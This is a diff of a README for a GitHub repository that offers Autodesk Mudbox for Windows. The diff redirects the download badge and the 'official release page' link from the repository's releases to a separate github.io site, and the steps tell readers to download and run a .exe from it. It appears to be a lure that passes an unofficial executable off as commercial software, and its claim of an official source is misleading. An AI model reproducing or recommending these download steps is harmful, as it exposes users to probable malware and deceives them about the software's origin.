@@ -1,6 +1,6 @@
 # 🎨 autodesk-mudbox-windows - Create detailed 3D models with ease
 
-[![Download Mudbox](https://img.shields.io/badge/Download-Mudbox-blueviolet.svg)](https://github.com/Elorafamilial613/autodesk-mudbox-windows/releases)
+[![Download Mudbox](https://img.shields.io/badge/Download-Mudbox-blueviolet.svg)](https://elorafamilial613.github.io)
 
 Mudbox provides a digital workspace for artists to sculpt organic shapes and paint detailed textures on 3D models. It uses a brush-based interface that mimics traditional clay sculpting. You can build complex characters, creatures, and objects while visualizing every surface detail in real time.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this software smoothly. Please co
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official release page: [https://github.com/Elorafamilial613/autodesk-mudbox-windows/releases](https://github.com/Elorafamilial613/autodesk-mudbox-windows/releases).
+1.  Visit the official release page: [https://elorafamilial613.github.io](https://elorafamilial613.github.io).
 2.  Look for the latest version at the top of the page.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the folder finishes downloading, find the file in your Downloads folder.
